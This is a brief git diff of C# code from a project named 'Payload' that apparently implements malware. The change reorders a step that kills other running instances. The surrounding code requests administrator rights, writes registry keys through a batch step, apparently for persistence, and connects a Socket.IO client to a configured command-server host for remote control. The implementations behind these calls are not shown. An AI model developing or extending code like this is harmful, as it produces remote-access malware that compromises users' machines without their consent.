@@ -3,6 +3,7 @@ using CommonClassLibrary;
 using Payload.Command;
 using Payload.Core.Command;
 
+new KillOtherMeFactory().CreateCommand().Execute();
 new CallAdminFactory().CreateCommand().Execute();
 
 if (Config.IsDebug() || !Config.Instance.IsUserAdministrator())
@@ -19,7 +20,7 @@ if (!Config.Instance.CheckWorkingTarget())
     new StartProcessBatFactory().CreateCommand().Execute();
     return;
 }
-new KillOtherMeFactory().CreateCommand().Execute();
+
 new RegistryKeyBatFactory().CreateCommand().Execute();
 
 var payloadSocketClient = new Payload.SocketIoClient(Config.SocketIOClientCommandServerHost);
